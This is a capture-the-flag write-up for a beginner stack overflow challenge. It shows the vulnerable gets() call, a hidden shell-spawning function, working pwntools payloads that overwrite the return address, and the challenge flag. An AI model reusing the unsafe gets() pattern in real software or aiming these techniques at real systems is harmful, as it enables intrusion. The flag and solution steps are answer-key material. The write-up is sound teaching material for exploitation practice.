# Space Station Alpha - Exploit Writeup

## Overview

This is a **very easy** stack buffer overflow challenge. The goal is to overflow a buffer to overwrite the return address and redirect execution to a hidden function that spawns a shell.

---

## Vulnerability Analysis

### 1. Identifying the Vulnerability

Looking at the source code or decompiling with Ghidra/IDA, we find in `authenticate()`:

```c
char access_code[64];  // Only 64 bytes!
gets(access_code);     // DANGEROUS: No bounds checking!
```

The `gets()` function is notorious for being unsafe because it reads input until a newline without any size limit. This allows us to overflow the 64-byte buffer.

### 2. Finding the Target Function

The binary contains a hidden function `unlock_override()` that spawns a shell:

```c
void unlock_override() {
    system("/bin/sh");
}
```

Find its address using objdump:

```bash
$ objdump -d spaceterm | grep unlock_override
0000000000401196 <unlock_override>:
```

**Note:** Your address may differ slightly. Always verify!

---

## Exploitation Steps

### Step 1: Determine the Offset

The buffer is 64 bytes. On x86-64, we also need to account for:
- 64 bytes of buffer
- 8 bytes of saved RBP (base pointer)
- = **72 bytes** to reach the return address

You can verify this with GDB:

```bash
$ gdb ./spaceterm
(gdb) disas authenticate
(gdb) break *authenticate+XX  # at the 'ret' instruction
(gdb) run
```

Or use a cyclic pattern:

```bash
$ python3 -c "from pwn import *; print(cyclic(100).decode())" | ./spaceterm
# Check crash in GDB, find offset with cyclic_find()
```

### Step 2: Find the Target Address

```bash
$ objdump -d spaceterm | grep unlock_override
0000000000401196 <unlock_override>:
```

### Step 3: Build the Payload

```
[  64 bytes padding  ][  8 bytes RBP  ][  8 bytes RET ADDRESS  ]
         'A' * 64           'B' * 8         p64(0x401196)
```

### Step 4: Exploit!

```bash
$ python3 -c "from pwn import *; print(b'A'*72 + p64(0x401196))" | ./spaceterm
```

But wait! This pipes the exploit and immediately closes stdin. The shell spawns but has no input.

**Solution:** Keep stdin open:

```bash
$ (python3 -c "from pwn import *; import sys; sys.stdout.buffer.write(b'A'*72 + p64(0x401196) + b'\n')"; cat) | ./spaceterm
```

Or use the pwntools script (recommended).

---

## Exploit Execution

Using the provided `exploit.py`:

```bash
$ python3 exploit.py
[+] Starting local process './spaceterm': pid 12345
[*] Target address: 0x401196
[*] Sending payload...
[*] Switching to interactive mode
$ cat flag.txt
GTH{0v3rfl0w_t0_th3_st4rs}
```

---

## Key Concepts

| Concept | Explanation |
|---------|-------------|
| **gets()** | Dangerous function with no bounds checking |
| **Stack Buffer Overflow** | Writing past buffer bounds to corrupt stack |
| **Return Address Overwrite** | Redirecting execution by changing saved RIP |
| **No PIE** | Binary loaded at fixed address, no ASLR bypass needed |
| **No Stack Canary** | No protection detecting stack corruption |

---

## Tools Used

- `objdump -d` - Disassemble binary to find function addresses
- `gdb` - Debug and analyze crash behavior
- `pwntools` - Python library for exploit development

---

## Flag

```
GTH{0v3rfl0w_t0_th3_st4rs}
```
